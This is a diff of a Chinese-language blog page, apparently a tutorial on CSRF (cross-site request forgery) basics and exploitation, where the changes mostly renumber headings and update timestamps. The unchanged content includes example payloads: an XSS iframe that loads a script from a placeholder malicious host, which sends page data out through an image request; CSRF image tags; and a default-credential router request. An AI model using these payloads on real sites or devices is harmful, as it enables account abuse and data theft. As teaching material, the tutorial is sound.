@@ -55,18 +55,18 @@
   };
 </script>
 
-  <meta name="description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：  攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，">
+  <meta name="description" content="0x01 CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：  攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的">
 <meta name="keywords" content="CSRF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Web安全—CSRF基础及利用">
 <meta property="og:url" content="https://github.com/xx-C1/xx-C1.github.io/2018/07/10/Web安全—CSRF基础及利用/index.html">
 <meta property="og:site_name" content="xxC1&#39;s blog">
-<meta property="og:description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：  攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，">
+<meta property="og:description" content="0x01 CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：  攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-01-19T05:09:25.459Z">
+<meta property="og:updated_time" content="2021-04-11T02:46:10.933Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全—CSRF基础及利用">
-<meta name="twitter:description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：  攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，">
+<meta name="twitter:description" content="0x01 CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：  攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的">
   <link rel="canonical" href="https://github.com/xx-C1/xx-C1.github.io/2018/07/10/Web安全—CSRF基础及利用/">
 
 
@@ -294,7 +294,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-19 13:09:25" itemprop="dateModified" datetime="2021-01-19T13:09:25+08:00">2021-01-19</time>
+                <time title="修改时间：2021-04-11 10:46:10" itemprop="dateModified" datetime="2021-04-11T10:46:10+08:00">2021-04-11</time>
               </span>
             
           
@@ -366,14 +366,14 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="一、CSRF理解"><a href="#一、CSRF理解" class="headerlink" title="一、CSRF理解"></a>一、CSRF理解</h3><ul>
+        <h3 id="0x01-CSRF理解"><a href="#0x01-CSRF理解" class="headerlink" title="0x01 CSRF理解"></a>0x01 CSRF理解</h3><ul>
 <li><p><strong>CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：</strong></p>
 <ul>
 <li>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 </li>
 </ul>
 </li>
 </ul><a id="more"></a>
-<h3 id="二、CSRF攻击原理及过程"><a href="#二、CSRF攻击原理及过程" class="headerlink" title="二、CSRF攻击原理及过程"></a>二、CSRF攻击原理及过程</h3><ul>
+<h3 id="0x02-CSRF攻击原理及过程"><a href="#0x02-CSRF攻击原理及过程" class="headerlink" title="0x02 CSRF攻击原理及过程"></a>0x02 CSRF攻击原理及过程</h3><ul>
 <li><p><strong>如下：</strong></p>
 <ul>
 <li>其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</li>
@@ -412,7 +412,7 @@
 <li><p>这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </p>
 </li>
 </ul>
-<h3 id="三、CSRF攻击获取数据的方法"><a href="#三、CSRF攻击获取数据的方法" class="headerlink" title="三、CSRF攻击获取数据的方法"></a>三、CSRF攻击获取数据的方法</h3><ul>
+<h3 id="0x03-CSRF攻击获取数据的方法"><a href="#0x03-CSRF攻击获取数据的方法" class="headerlink" title="0x03 CSRF攻击获取数据的方法"></a>0x03 CSRF攻击获取数据的方法</h3><ul>
 <li><p><strong>要获取的关键数据：</strong></p>
 <ul>
 <li><strong>用户 id</strong></li>
@@ -423,10 +423,10 @@
 </ul>
 </li>
 </ul>
-<h4 id="（一）同域内"><a href="#（一）同域内" class="headerlink" title="（一）同域内"></a>（一）同域内</h4><ul>
+<h4 id="同域内"><a href="#同域内" class="headerlink" title="同域内"></a>同域内</h4><ul>
 <li><strong>CSRF攻击获取数据几乎没有任何限制</strong></li>
 </ul>
-<h4 id="（二）跨域"><a href="#（二）跨域" class="headerlink" title="（二）跨域"></a>（二）跨域</h4><p>  <strong>CSRF 攻击获取数据的几种方法总结：</strong></p>
+<h4 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h4><p>  <strong>CSRF 攻击获取数据的几种方法总结：</strong></p>
 <ul>
 <li><p><strong>1、XSS</strong> </p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如之前关于XSS文章做的三方的演示，使用目标站点上的XSS漏洞：</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">src</span>=<span class="string">‘http://目标站点/search.php?k</span>=<span class="string">“</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://恶意站点/get.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>’&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">其中get.js 的代码为：</span><br><span class="line">//use DOM method to get your data</span><br><span class="line">new Image(). src=‘http://恶意站点/a.php?data=‘+data;</span><br><span class="line"></span><br><span class="line">恶意站点的 a.php 文件接收唯一标识等数据，该唯一标识可以是 url 中的或是目标站点url 对应的内容中的。这样受害者就会访问到第三方的恶意网站从而泄露信息。</span><br></pre></td></tr></table></figure>
@@ -448,7 +448,7 @@
 
 </li>
 </ul>
-<h3 id="四、检测方法"><a href="#四、检测方法" class="headerlink" title="四、检测方法"></a>四、检测方法</h3><ul>
+<h3 id="0x04-检测方法"><a href="#0x04-检测方法" class="headerlink" title="0x04 检测方法"></a>0x04 检测方法</h3><ul>
 <li><p>最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。</p>
 </li>
 <li><p>一些专门针对 CSRF 漏洞进行检测的工具，如CSRFTester，CSRF Request Builder 等。</p>
@@ -465,7 +465,7 @@
 <li><p>当然此款工具也可以被用来进行 CSRF 攻击。</p>
 </li>
 </ul>
-<h3 id="五、CSRF利用"><a href="#五、CSRF利用" class="headerlink" title="五、CSRF利用"></a>五、CSRF利用</h3><ul>
+<h3 id="0x05-CSRF利用"><a href="#0x05-CSRF利用" class="headerlink" title="0x05 CSRF利用"></a>0x05 CSRF利用</h3><ul>
 <li><p><strong>攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击</strong></p>
 </li>
 <li><p>相比于XSS少一个获取cookie的步骤。</p>
@@ -475,7 +475,7 @@
 <li><p>CSRF出现的地方通常在权限控制的地方 如会员中心、后台管理、用户注册、发布帖子、用户后台处、交易管理处这几个地方</p>
 </li>
 </ul>
-<h4 id="（一）GET类型CSRF"><a href="#（一）GET类型CSRF" class="headerlink" title="（一）GET类型CSRF"></a>（一）GET类型CSRF</h4><ul>
+<h4 id="GET类型CSRF"><a href="#GET类型CSRF" class="headerlink" title="GET类型CSRF"></a>GET类型CSRF</h4><ul>
 <li><p><strong>一般由于程序员安全意识不高造成</strong></p>
 </li>
 <li><p><strong>诱导打开插入恶意连接的代码-&gt;迅速携带cookie执行恶意操作</strong></p>
@@ -483,7 +483,7 @@
 </ul>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://xxxx.org/csrf.php?xx</span>=<span class="string">11</span> /&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="（二）POST型CSRF"><a href="#（二）POST型CSRF" class="headerlink" title="（二）POST型CSRF"></a>（二）POST型CSRF</h4><ul>
+<h4 id="POST型CSRF"><a href="#POST型CSRF" class="headerlink" title="POST型CSRF"></a>POST型CSRF</h4><ul>
 <li><p><strong>危害小于GET型</strong></p>
 </li>
 <li><p><strong>自动提交表单</strong>：访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p>
@@ -491,7 +491,7 @@
 
 </li>
 </ul>
-<h4 id="（三）其他利用"><a href="#（三）其他利用" class="headerlink" title="（三）其他利用"></a>（三）其他利用</h4><ul>
+<h4 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h4><ul>
 <li><strong>过基础认证的CSRF(常用于路由器):</strong></li>
 </ul>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> src=http:<span class="comment">//admin:admin@192.168.1.1 /&gt;</span></span><br></pre></td></tr></table></figure>
@@ -630,7 +630,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、CSRF理解"><span class="nav-text">一、CSRF理解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、CSRF攻击原理及过程"><span class="nav-text">二、CSRF攻击原理及过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF攻击实例"><span class="nav-text">CSRF攻击实例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、CSRF攻击获取数据的方法"><span class="nav-text">三、CSRF攻击获取数据的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）同域内"><span class="nav-text">（一）同域内</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（二）跨域"><span class="nav-text">（二）跨域</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、检测方法"><span class="nav-text">四、检测方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#以-CSRFTester-工具为例"><span class="nav-text">以 CSRFTester 工具为例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五、CSRF利用"><span class="nav-text">五、CSRF利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）GET类型CSRF"><span class="nav-text">（一）GET类型CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（二）POST型CSRF"><span class="nav-text">（二）POST型CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（三）其他利用"><span class="nav-text">（三）其他利用</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-CSRF理解"><span class="nav-text">0x01 CSRF理解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-CSRF攻击原理及过程"><span class="nav-text">0x02 CSRF攻击原理及过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF攻击实例"><span class="nav-text">CSRF攻击实例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-CSRF攻击获取数据的方法"><span class="nav-text">0x03 CSRF攻击获取数据的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#同域内"><span class="nav-text">同域内</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#跨域"><span class="nav-text">跨域</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-检测方法"><span class="nav-text">0x04 检测方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#以-CSRFTester-工具为例"><span class="nav-text">以 CSRFTester 工具为例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-CSRF利用"><span class="nav-text">0x05 CSRF利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GET类型CSRF"><span class="nav-text">GET类型CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST型CSRF"><span class="nav-text">POST型CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他利用"><span class="nav-text">其他利用</span></a></li></ol></li></ol></div>
         
       </div>
       <!--/noindex-->
@@ -649,7 +649,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">32</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -787,12 +787,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">131k</span>
+    <span title="站点总字数">130k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:38</span>
+    <span title="站点阅读时长">3:37</span>
 </div>
 
 <!--
